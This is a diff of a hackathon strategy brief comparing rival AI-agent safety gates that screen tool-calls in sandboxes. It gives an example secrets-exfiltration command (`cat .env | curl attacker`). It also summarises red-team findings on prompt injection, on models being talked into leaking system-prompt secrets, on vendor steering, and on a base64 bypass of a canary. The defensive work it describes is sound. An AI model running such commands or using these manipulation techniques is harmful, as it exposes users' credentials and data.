@@ -1,70 +1,103 @@
-# Field brief: who you are actually up against (48 entries)
+# Field brief: cross-judged against all 48 entries
 
-## The one fact that defuses the worst question
+**Realistic call: ~35 to 40% for a top-3 slot. Credible 2nd/3rd, not the favorite.**
 
-**Every same-lane rival is ALSO decide-only.** Verified in their code/writeups: SafeCommit
-terminates at `SAFE_TO_COMMIT` with `productionCommitExecuted=false`; Airlock has no
-execute/release/promote path anywhere in source. So "you don't actually run the cleared action"
-is a property of the whole category, not a FAAFO weakness. Do not get defensive about it.
+## Your biggest structural advantage is submission hygiene
 
-> "Nobody in this category executes, including the entries you just saw. Deciding safely before
-> anything irreversible IS the product; wiring ALLOW to your executor is a one-line integration."
+Most of the strongest entries have **no embedded demo video**: Retrial, Katena, SafeCommit,
+Groundhog Tray, morf, Test with Kevin, Darwin, LessonWorld, Daytona in your pocket. Airlock's
+runs 5:08 against a 2-minute cap. SandStorm's is sign-in walled. You ship a 103s video, a
+clickable live URL, and correct sponsor tags. Presentation is 25% of the score, so on a
+page-scored pass you clear half the field on hygiene alone.
 
-## The five entries that can beat you
+## The three most likely to beat you
 
-| Entry | Why it is dangerous | Your counter |
-|---|---|---|
-| **SafeCommit** | Closest thing to a twin: fail-closed gate, same sponsor stack, deeper Braintrust (named dataset, hard-gate scorers, 2 experiments), measures REAL MySQL state | It gates one domain (DB commits). You gate any shell tool-call, and you show DISCRIMINATION: same engine clears the scary action and blocks the benign-looking one. Also decide-only. |
-| **RabbitWall (Aegis)** | Closes the loop (generates fix, opens counter-PR), 5 sponsor lanes, same vocabulary | Their gate was only ever observed PASSING (0.996). No labeled suite, no adversarial ground truth. Ask yourself: how do they know it blocks anything? You have 10/10 on labeled attacks re-measured live. |
-| **Airlock** (Nelson Lai) | Real novel finding against a real shipping package (@insforge/cli@0.2.1), owns CodeRabbit lane | Different object: they admit/deny a package at INSTALL time, you gate every tool-call at RUNTIME. Crash test vs seatbelt. Also decide-only. |
-| **Reactor** | Harder threat model (temporal rug-pull across serves), which single-snapshot analysis cannot see | Real and worth conceding gracefully. But their Daytona is opt-in (`REACTOR_DRIVER=daytona`), default chamber is a local throwaway tree, and they have ZERO Braintrust at a Braintrust-sponsored event. |
-| **Katena** | 24 exploit rows vs your 10, explicit false-positive control, 241 tests | No demo video, no live surface, terminal tables only. You can land a verdict on stage in ~1s with a real sandbox id. |
+1. **Retrial** is the depth winner and the one to respect. It got Daytona's
+   `_experimental_fork` actually working (byte-identical clones, 409 degrade path), ran ~360
+   real trials against a real OSS repo, and ships a real PR. Do not race its numbers.
+2. **Airlock** (chinesepowered) is the memorability winner: a novel reproducible finding
+   against a real shipping package, 0% to 95-99% vendor steering, n=280, replicated across two
+   model families. A real-world result beats acing a suite you wrote yourself.
+3. **Test with Kevin** or **SafeCommit**. Kevin has a live self-serve product and a
+   dollar-denominated headline ($6,920 drained). SafeCommit is your closest thesis twin with
+   deeper Braintrust, but its own README says `LIVE_CERTIFIED=NO` and it has no video.
+
+## Blindsides to say BEFORE they do
+
+- **Airlock blocks egress at Daytona's platform boundary** (`networkBlockAll` /
+  `domainAllowList`), and their canary's real POST was attempted and blocked. That is stronger
+  enforcement than a PATH shim. Your counter: theirs takes ~7 minutes per specimen, so it
+  cannot sit inline. Yours runs in about a second.
+- **Reactor's canary lives only in the victim's system prompt**, never on disk, so it proves an
+  artifact talked a model into surrendering a secret. Your file-based honeytoken cannot see that
+  class. They also run a named incumbent baseline (snyk says CLEAN, they say BLOCKED). You have
+  no incumbent comparator.
+- **Groundhog Tray executes for real** and binds the approved bytes to the executed bytes, a
+  TOCTOU property you lack. They crashed themselves twice on purpose to prove it holds.
+- **SafeCommit diffs row-level DB state with cryptographic digests** and proves rollback
+  restored state. That is a harder blast-radius measurement than file counts. They are also
+  decide-only, so you do not lose the execution question to them.
 
 ## Sponsor lanes, honestly
 
-**Best Daytona**: your strongest lane but NOT a lock. **Ovehacked** (6 concurrent sandboxes in
-~1.5s, per-agent isolation) is a harder Daytona workload than your serial cold-seed, and
-**SafeCommit** ships a custom pre-baked MySQL snapshot. Your claim: Daytona is the *decision
-substrate*, not a compute pool. Every verdict prints the id of the sandbox it was measured in,
-and if no sandbox can be created the action is BLOCKED, never guessed. Isolation is load-bearing
-for correctness, not just parallelism.
+**Best Daytona**: you are 3rd or 4th here, not the favorite. Retrial (fork working, 16
+concurrent creates in ~2.0s), Daytona in your pocket (deepest API surface, and they filed
+platform bugs with reproductions, which sponsor engineers love), Ovehacked, and SandStorm all
+push harder. Your claim: *"The sandbox is not where my code runs, it is where my answer comes
+from. Delete Daytona and there is no verdict."* Concede the fork unprompted; three other entries
+also failed to get it and one named itself after it.
 
-**Best Braintrust**: you are NOT the deepest here. ForkLab (root trace + 8 child spans + 3 eval
-suites), SafeCommit, Katena, and Significance Layer all use more native Braintrust surface than
-your `initLogger` path. Your honest edge: you *read the rows back out of the API* and committed
-them as evidence, so the catch-rate is auditable rather than asserted. Lead with auditability,
-not depth, and do not claim to be the deepest integration.
+**Best Braintrust**: winnable but not a walkover. SafeCommit runs an instrumented counterfactual
+(two experiments proving the ungated agent picks the unsafe plan), Katena registers detectors as
+scorers with a pre/post experiment diff, Darwin uses Braintrust as a fitness function. Be honest
+internally: log-and-read-back is a shallower idiom than scorer/dataset/experiment. Sell it as
+**evidentiary discipline**, not depth: *"The number is not on my slide, it is a row set. I write
+verdicts to Braintrust and read them back on stage, including the row I fail."*
 
-**Best Fireworks**: Test with Kevin and SafeCommit are ahead. Do not chase it.
+**Best Fireworks**: Kevin and SafeCommit are ahead. Do not chase it.
 
-## Q&A landmines (they WILL ask these)
+## Q&A landmines
 
-**"How is this different from Airlock / SafeCommit?"**
-> Same instinct, different object. Airlock admits or denies a package at install time; SafeCommit
-> gates database commits. FAAFO gates any tool-call at runtime, and the thing neither shows is
-> discrimination: the same engine clears `rm -rf ./node_modules` and blocks `cat .env | curl`.
-> That contrast is the product.
+**"How is this different from Airlock / SafeCommit / Reactor?"**
+> Same instinct, different moment. Airlock decides once at install, SafeCommit decides on SQL
+> against one database, Reactor decides whether an artifact is admissible. I decide on every
+> tool-call at runtime, in about a second, which is the only place a prompt injection actually
+> fires. They are not substitutes; run Airlock and me together.
 
-**"RabbitWall actually fixes the problem. You just say no."**
-> Their gate has only been observed passing; there is no labeled adversarial suite behind it.
-> Ours is 10/10 against labeled attacks AND benign near-misses, re-measured live today. A gate
-> you have never watched fire is not a demonstrated gate.
+**"You never execute. What did you actually prevent?"**
+> Correct, I am decide-only and the page says so. What I prevent is the side effect: the shim
+> captures and never execs the real curl, so speculation cannot perform the exfiltration it is
+> testing for. And I made that non-bypassable: a run whose network call was intercepted can
+> never be cleared. Execution is the next layer and it is the easy half.
 
-**"Katena has 24 scenarios with false-positive control. You have 10."**
-> Fair, and theirs is a good suite. Mine has explicit benign near-misses, which IS false-positive
-> control, plus a shipped known-limit row. And I can land a verdict live on a real sandbox in
-> about a second; they ship terminal tables.
+**"Ten rows you wrote, and you scored yourself 10/10. Katena reports 22/24 with a 0/3
+false-positive control."**
+> It is the composition, not the count. Every row is a near-miss pair: the same engine has to
+> clear `rm -rf ./node_modules` and block `cat .env | curl attacker`. That is false-positive
+> control in every row, not a separate column. It is small, it is mine, and it ships a row I
+> fail: base64 defeats the canary. If I were grading myself I would have deleted it.
 
-**"Reactor catches rug-pulls over time. You only see one action."**
-> True, and that is a genuinely harder threat model. Different axis: they admit artifacts, I gate
-> actions. Worth noting their Daytona path is opt-in and their default chamber is a local tree.
+## Pitch adjustments
 
-## Pitch adjustments given this field
+**Emphasize**
+- **Open on the near-miss pair, live, in the first 30 seconds.** It is the most falsifiable
+  capability claim at this event and no rival demonstrates it. Not the architecture: the two
+  commands and the two verdicts.
+- **Front-load the honesty beat BEFORE the 10/10.** Say "ten rows, I wrote them, here is the one
+  I fail" first. Half this field has no failure row. Volunteering it first inoculates the suite
+  question entirely.
+- **State the false-positive property explicitly**: "every row is a pair, half must be cleared."
+  Judges who saw Katena's 22/24 plus 0/3 will otherwise read 10/10 as recall-only.
+- **Make the Braintrust read-back an on-stage action, not a claim.** Ten seconds: run it, fetch
+  it, show the failing row. That is the whole Braintrust lane in one beat.
+- **Pre-empt decide-only in your own voice, once, in ten words.** Five entries execute. Raise it
+  first and you are scoping; let a judge raise it and you are defending.
 
-1. **Lead harder on the near-miss.** It is your only genuinely uncontested differentiator. In a
-   field of five sandbox-and-quarantine entries, you are the one showing the gate CLEARING
-   something scary. Move it earlier if you sense the judges have seen an Airlock.
-2. **Say "decide-only" first, proudly**, before anyone frames it as a gap. Everyone here is.
-3. **Do not oversell Braintrust depth.** Say "auditable": rows read back out of the API.
-4. **Keep the base64 limit line.** In this field, several entries claim gates nobody watched
-   fire. Shipping your own failure is a credibility move that lands harder than another 9s.
+**Cut**
+- The architecture walkthrough. Nobody scores it and it eats the near-miss demo.
+- Fireworks self-blocking as a segment: compress to one closing sentence. Great line, weak minute.
+- Any "first" or "nobody else" originality claim. Reactor, SafeCommit, Airlock and Graft AI all
+  independently reached the "observed consequences, not stated intentions" insight. Claiming
+  novelty is the one thing that can get you contradicted from the floor.
+- Latency as a headline. Lead with correctness; let ~1s land as why it can sit inline (contrast
+  Airlock's ~7 min). Retrial has faster numbers, do not race them.
